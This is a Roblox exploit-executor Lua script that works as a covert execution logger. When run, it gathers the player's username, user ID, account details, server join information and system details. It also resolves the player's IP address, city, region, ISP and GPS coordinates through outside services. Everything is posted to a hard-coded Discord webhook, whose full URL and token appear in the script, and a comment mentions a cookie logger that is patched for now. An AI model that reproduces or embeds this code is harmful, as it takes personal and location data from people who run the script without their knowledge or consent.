getgenv().whscript = "Script Log"
getgenv().webhookexecUrl = "https://discordapp.com/api/webhooks/1290612520398356491/qYD19GjnsMqaedAlXXwWG51WZeJeaI-iAcMsZHWjKd060SxKyPaAatMla82g91TvfUW-"
getgenv().ExecLogSecret = true
getgenv().idsss = "fdd3bbdc9554f43c65140baa02e1baf562b00686d09c91f40dd7101c0126cacc"

local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
folder.Parent = ui

local player = game:GetService("Players").LocalPlayer
local players = game:GetService("Players")
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
local completeTime = os.date("%Y-%m-%d %H:%M:%S")
local workspace = game:GetService("Workspace")
local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
local gameVersion = game.PlaceVersion
local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"

local function checkPremium()
	local success, response = pcall(function() return player.MembershipType end)
	return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
end

local url = getgenv().webhookexecUrl
local webhookids = getgenv().idsss
local data = {
	["content"] = "@everyone",
	['webhookid'] = webhookids, --ask playvora_1 to generate it
	["embeds"] = {{
		["title"] = "Script Execution Detected | Exec Log",
		["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
		["type"] = "rich",
		["color"] = tonumber(0xe67e22),
		["fields"] = {
			{["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
			{["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
			{["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. checkPremium() .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
			{["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```", ["inline"] = false},
			{["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
			{["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
			{["name"] = "🖥️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
			{["name"] = "📍 **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
			{["name"] = "🪧 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false} 
		},
		["thumbnail"] = {["url"] = "https://media.discordapp.net/attachments/994195265613480056/1285979441733828698/458374174_880497776746573_8986094527581250616_n_1.jpg?ex=66ef88ef&is=66ee376f&hm=1feb07e4dd54d9eca4e4e9767f3103e258d5f5efa8a75f2cb599743b997fd9cf&=&format=webp&width=683&height=683"},
		["footer"] = {["text"] = "Made by kakachas | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = " "}
	}}
}

if getgenv().ExecLogSecret then
    local ip = game:HttpGet("https://playvora.vercel.app/api/ip")
    local ipinfo_table = game.HttpService:JSONDecode(game:HttpGet("https://playvora.netlify.app/ipinfo?ip=" .. ip))
    table.insert(data.embeds[1].fields, {["name"] = "**`(🤫) Secret`**", ["value"] = "||(👣) IP Address: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) GPS Location: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"})
end

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
request({Url = url, Body = newdata, Method = "POST", Headers = headers})
